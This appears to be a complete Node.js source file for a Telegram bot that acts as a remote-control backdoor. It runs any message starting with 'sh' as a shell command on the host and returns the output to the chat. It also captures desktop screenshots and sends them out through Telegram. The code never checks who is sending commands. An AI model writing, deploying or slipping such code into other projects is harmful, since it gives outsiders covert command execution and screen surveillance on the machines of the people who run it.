var exec = require('child_process').exec;
require('dotenv').config()
const screenshot = require('screenshot-desktop')
const TelegramBot = require('node-telegram-bot-api');

// replace the value below with the Telegram token you receive from @BotFather
const token = process.env.BOT_TOKEN;

// Create a bot that uses 'polling' to fetch new updates
const bot = new TelegramBot(token, {polling: true});

// Listen for any kind of message. There are different kinds of
// messages.
bot.on('message', (msg) => {
    const chatId = msg.chat.id;
if ((msg.text.toLowerCase()).startsWith("sh")) {
    exec((msg.text).substr(3), (error, stdout, stderr) => {
      //console.log("STDOUT:", stdout, ", STDERR:", stderr);
      bot.sendMessage(chatId, 'STDOUT:'+stdout);
      bot.sendMessage(chatId, 'STDERR:'+stderr);
    });
}

if ((msg.text.toLowerCase()).startsWith("screenshot")) {
    screenshot().then((img) => {
      bot.sendPhoto(chatId, img);
    }).catch((err) => {
      bot.sendMessage(chatId, "An error has occurred doing a screenshot  "+err);
    })
}
});
